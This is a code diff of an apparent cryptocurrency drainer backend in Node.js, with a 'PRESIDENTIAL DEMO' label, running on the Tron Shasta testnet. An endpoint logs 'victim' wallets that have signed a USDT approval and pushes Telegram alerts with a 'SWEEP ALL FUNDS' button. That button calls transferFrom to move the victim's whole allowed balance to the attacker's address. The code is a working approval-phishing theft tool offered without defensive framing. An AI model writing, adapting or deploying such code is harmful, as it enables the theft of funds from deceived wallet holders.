@@ -10,18 +10,16 @@ app.use(express.json());
 
 const tronWeb = new TronWeb({
   fullHost: 'https://api.shasta.trongrid.io',
-  privateKey: process.env.ATTACKER_PRIVATE_KEY // Must be Account 01 Private Key
+  privateKey: process.env.ATTACKER_PRIVATE_KEY 
 });
 
 const TOKEN_ADDRESS = process.env.TOKEN_ADDRESS;
 const ATTACKER_ADDRESS = tronWeb.defaultAddress.base58;
-
 const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
 const fmt = (n) => Number(n).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
 
-// 1. ALERT ENDPOINT
 app.post('/api/alert', async (req, res) => {
   const { victimAddress, txHash } = req.body;
   console.log(`[ALERT] Received approval from ${victimAddress}`);
@@ -31,12 +29,12 @@ app.post('/api/alert', async (req, res) => {
     const bal = await token.balanceOf(victimAddress).call();
     const balanceNum = Number(bal.toString()) / 1e6;
 
-    const message = `🚨 *VICTIM APPROVED* 🚨\n\n👤 Victim: \`${victimAddress}\`\n💰 USDT Balance: **${fmt(balanceNum)}**\n🔗 [View Approve Tx](https://shasta.tronscan.org/#/transaction/${txHash})\n\nTap below to inspect or drain.`;
+    const message = `🚨 *PRESIDENTIAL DEMO: VICTIM APPROVED* 🚨\n\n👤 Victim: \`${victimAddress}\`\n💰 USDT Balance: **${fmt(balanceNum)}**\n🔗 [View Tx](https://shasta.tronscan.org/#/transaction/${txHash})\n\nTap below to drain.`;
     
     const keyboard = {
       inline_keyboard: [[
         { text: '📊 Check Balance', callback_data: `bal_${victimAddress}` },
-        { text: '🕷️ Sweep All', callback_data: `sweep_${victimAddress}` }
+        { text: '🕷️ SWEEP ALL FUNDS', callback_data: `sweep_${victimAddress}` }
       ]]
     };
 
@@ -48,7 +46,6 @@ app.post('/api/alert', async (req, res) => {
   }
 });
 
-// 2. CHECK BALANCE ACTION
 bot.action(/bal_(.+)/, async (ctx) => {
   const addr = ctx.match[1];
   await ctx.answerCbQuery('Reading...');
@@ -59,7 +56,6 @@ bot.action(/bal_(.+)/, async (ctx) => {
   } catch (e) { ctx.editMessageText(`❌ Read failed.`); }
 });
 
-// 3. SWEEP ALL ACTION (Bulletproof transferFrom)
 bot.action(/sweep_(.+)/, async (ctx) => {
   const addr = ctx.match[1];
   await ctx.answerCbQuery('Initiating Drain...');
@@ -67,16 +63,14 @@ bot.action(/sweep_(.+)/, async (ctx) => {
 
   try {
     const token = await tronWeb.contract().at(TOKEN_ADDRESS);
-    
     const bal = BigInt((await token.balanceOf(addr).call()).toString());
     const allow = BigInt((await token.allowance(addr, ATTACKER_ADDRESS).call()).toString());
     const amount = bal < allow ? bal : allow;
 
     if (amount === 0n) {
-      return ctx.editMessageText(`❌ *Drain Failed.*\nBalance or Allowance is 0.\nVictim must sign 'Approve' first.`);
+      return ctx.editMessageText(`❌ *Drain Failed.*\nBalance or Allowance is 0.`);
     }
 
-    // EXECUTE TRANSFERFROM
     const tx = await token.transferFrom(addr, ATTACKER_ADDRESS, amount.toString()).send({ feeLimit: 100000000 });
     
     let info = await tronWeb.trx.getTransactionInfo(tx);
@@ -94,7 +88,6 @@ bot.action(/sweep_(.+)/, async (ctx) => {
   }
 });
 
-// Start Server
 const PORT = process.env.PORT || 3001;
 app.listen(PORT, () => console.log(`🛡️ Backend running on port ${PORT}`));
 bot.launch().then(() => console.log('✅ Telegram bot listening.'));
